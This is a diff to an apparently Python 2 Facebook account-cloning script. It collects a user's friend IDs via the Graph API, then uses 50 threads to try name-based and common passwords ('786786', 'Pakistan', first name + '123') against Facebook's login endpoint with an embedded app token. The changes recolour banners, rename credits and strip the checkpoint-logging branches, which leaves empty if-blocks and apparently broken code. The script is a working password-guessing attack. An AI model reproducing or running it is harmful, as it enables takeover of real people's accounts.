@@ -48,17 +48,17 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;91m███╗░░░███╗██╗░██████╗██╗░░██╗██╗
+\033[1;92m███╗░░░███╗██╗░██████╗██╗░░██╗██╗
 \033[1;91m████╗░████║██║██╔════╝██║░░██║██║
 \033[1;91m██╔████╔██║██║╚█████╗░███████║██║
 \033[1;91m██║╚██╔╝██║██║░╚═══██╗██╔══██║██║
-\033[1;91m██║░╚═╝░██║██║██████╔╝██║░░██║██║
-\033[1;91m╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝
-\033[1;92m║══▒═♥═▒═♥═▒═══¤═¤═¤════════════¤═══║
+\033[1;92m██║░╚═╝░██║██║██████╔╝██║░░██║██║
+\033[1;92m╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝
+\033[0;39m💥══▒══▒══▒═══¤═¤═¤════════════¤═══💥
 \033[1;96m║✯ Creator ✯ JAM SHAHRUKH       ║    
-\033[1;98m║✯ JAM x MISHAL           ║  
+\033[1;98m║✯ MISHAL KHAN MISHI          ║  
 \033[1;96m║✯ I'm Not Responsible For Any Miss Use║
-\033[1;92m║══▒═♥═▒═♥═▒═══¤═¤═¤════════════¤═══║"""
+\033[0;39m💥══▒══▒══▒═══¤═¤═¤════════════¤═══💥"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -80,19 +80,19 @@ print  """
 \033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR JAM ~
 \033[1;97m************************************************
 
-\033[1;91m░░░░░██╗░█████╗░███╗░░░███╗
-\033[1;91m░░░░░██║██╔══██╗████╗░████║
-\033[1;91m░░░░░██║███████║██╔████╔██║
-\033[1;91m██╗░░██║██╔══██║██║╚██╔╝██║
-\033[1;91m╚█████╔╝██║░░██║██║░╚═╝░██║
-\033[1;91m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+\033[0;39m░░░░░██╗░█████╗░███╗░░░███╗
+\033[0;39m░░░░░██║██╔══██╗████╗░████║
+\033[0;39m░░░░░██║███████║██╔████╔██║
+\033[0;39m██╗░░██║██╔══██║██║╚██╔╝██║
+\033[0;39m╚█████╔╝██║░░██║██║░╚═╝░██║
+\033[0;39m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
 
-   \033[1;91m███╗░░░███╗██╗░██████╗██╗░░██╗██╗
-   \033[1;91m████╗░████║██║██╔════╝██║░░██║██║
-   \033[1;91m██╔████╔██║██║╚█████╗░███████║██║
-   \033[1;91m██║╚██╔╝██║██║░╚═══██╗██╔══██║██║
-   \033[1;91m██║░╚═╝░██║██║██████╔╝██║░░██║██║
-   \033[1;91m╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝
+   \033[1;92m███╗░░░███╗██╗░██████╗██╗░░██╗██╗
+   \033[1;92m████╗░████║██║██╔════╝██║░░██║██║
+   \033[1;92m██╔████╔██║██║╚█████╗░███████║██║
+   \033[1;92m██║╚██╔╝██║██║░╚═══██╗██╔══██║██║
+   \033[1;92m██║░╚═╝░██║██║██████╔╝██║░░██║██║
+   \033[1;92m╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝
 """
 
 CorrectUsername = "jam"
@@ -204,7 +204,7 @@ def menu():
 	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "\033[1;36;40m      ╚═════════════════════════════════╝"
-	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start♥Hacking"	
+	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start Hacking"	
 	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
 	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
 	pilih()
@@ -219,7 +219,7 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m◄══════════════════💥══════════════════►\n"
+		print " \033[1;36;40m◄════════════════════💥════════════════════►\n"
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
@@ -256,7 +256,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•═══\033[1;91mJAM-SHAHRUKH\033[1;97m═══•◈•"
+		print "\033[1;97m•◈•═════\033[1;91mJAM-SHAHRUKH\033[1;97m═════•◈•"
 		jalan('\033[1;91mGetting IDs \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -266,7 +266,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•══════••◈•\033[1;91mMISHAL-KHAN\033[1;95m•◈•══════••◈•"
+		print "\033[1;95m•◈•══════••◈•\033[1;91mMISHAL-KHAN-MISHI\033[1;95m•◈•══════••◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -292,10 +292,10 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;92m◄══════════════════💥══════════════════►"
+	print "   \033[1;92m◄════════════════════💥════════════════════►"
 
 	jalan('           \033[1;91mjamxmishi start cloning Wait...')
-	print  "  \033[1;92m ◄══════════════════💥══════════════════►" 
+	print  "  \033[1;92m ◄════════════════════💥════════════════════►" 
 
 	def main(arg):
 		global cekpoint,oks
@@ -320,14 +320,6 @@ def pilih_super():
 				oks.append(user+pass1)
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
-				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				    print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
-				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
-				    cek = open("out/super_cp.txt", "a")
-				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
-				    cek.close()
-				    cekpoint.append(user+pass1)
                                 else:
 				    pass2 = b['first_name'] + '123'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -341,15 +333,7 @@ def pilih_super():
 				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
 				            oks.append(user+pass2)
                                     else:
-			                   if 'www.facebook.com' in q["error_msg"]:
-				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
-				               cek = open("out/super_cp.txt", "a")
-				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
-				               cek.close()
-				               cekpoint.append(user+pass2)								
+			                   if 'www.facebook.com' in q["error_msg"]:      							
 				           else:											
 					       pass3 = '786000'									
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
@@ -363,15 +347,7 @@ def pilih_super():
 						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
 						       oks.append(user+pass3)
                                                else:
-			                               if 'www.facebook.com' in q["error_msg"]:
-				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
-				                           cek = open("out/super_cp.txt", "a")
-				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
-				                           cek.close()
-				                           cekpoint.append(user+pass3)									
+			                               if 'www.facebook.com' in q["error_msg"]:  								
 					               else:										
 						           pass4 = '000786'										
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -385,15 +361,7 @@ def pilih_super():
 				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
 				                                   oks.append(user+pass4)
                                                            else:
-			                                           if 'www.facebook.com' in q["error_msg"]:
-				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
-				                                       cek = open("out/super_cp.txt", "a")
-				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
-				                                       cek.close()
-				                                       cekpoint.append(user+pass4)					
+			                                           if 'www.facebook.com' in q["error_msg"]:      				
 					                           else:									
 						                       pass5 = '786786'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
@@ -407,15 +375,7 @@ def pilih_super():
 						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
 						                               oks.append(user+pass5)	
                                                                        else:
-			                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
-				                                                   cek = open("out/super_cp.txt", "a")
-				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
-				                                                   cek.close()
-				                                                   cekpoint.append(user+pass5)					
+			                                                       if 'www.facebook.com' in q["error_msg"]:  				
 						                               else:								
 							                           pass6 = 'Pakistan'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -429,15 +389,7 @@ def pilih_super():
 				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
 				                                                           oks.append(user+pass6)
                                                                                    else:
-			                                                                   if 'www.facebook.com' in q["error_msg"]:
-				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
-				                                                               cek = open("out/super_cp.txt", "a")
-				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
-				                                                               cek.close()
-				                                                               cekpoint.append(user+pass6)	
+			                                                                   if 'www.facebook.com' in q["error_msg"]:      
 						                                           else:							
 								                               pass7 = b['last_name'] + '123'						
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
@@ -451,15 +403,7 @@ def pilih_super():
 									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
 									                               oks.append(user+pass7)
                                                                                                else:
-			                                                                               if 'www.facebook.com' in q["error_msg"]:
-				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
-				                                                                           cek = open("out/super_cp.txt", "a")
-				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
-				                                                                           cek.close()
-				                                                                           cekpoint.append(user+pass7)           					
+			                                                                               if 'www.facebook.com' in q["error_msg"]:           					
 								                                       else:						
 										                           pass8 = b['last_name'] + '786'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
@@ -473,15 +417,7 @@ def pilih_super():
 				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
 				                                                                                   oks.append(user+pass8)
                                                                                                            else:
-			                                                                                           if 'www.facebook.com' in q["error_msg"]:
-				                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishi-Checkpoint'
-				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass8 + '\n'
-				                                                                                       cek = open("out/super_cp.txt", "a")
-				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
-				                                                                                       cek.close()
-				                                                                                       cekpoint.append(user+pass8)   	
+			                                                                                           if 'www.facebook.com' in q["error_msg"]:   	
 										                                   else:					
 										                                       pass9 = b['first_name'] + '1234'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
@@ -495,26 +431,18 @@ def pilih_super():
 											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
 											                                       oks.append(user+pass9)
                                                                                                                        else:
-			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mMishal-Checkpoint'
-				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
-				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
-				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
-				                                                                                                   cek = open("out/super_cp.txt", "a")
-				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
-				                                                                                                   cek.close()
-				                                                                                                   cekpoint.append(user+pass9)		
+			                                                                                                       if 'www.facebook.com' in q["error_msg"]:  	
 											                                       
 																	
 															
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(50)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mJAM-SHAHRUKH\033[1;95m◈•▬ ▬ ▬•◈•"
 	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Mishal.py)↩\033[1;97m....'
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 jam.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
 
@@ -525,9 +453,9 @@ def pilih_super():
 ╚█████╔╝██║░░██║██║░╚═╝░██║
 ░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
  
-         Checkpoint ID Open After 7 Days
+         Only successful ids
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ..JamxMishi Creations.. \033[1;95m :
+: \033[1;91m ..Jam x Mishi Creations.. \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
               \033[1;91mShahrukh22"""
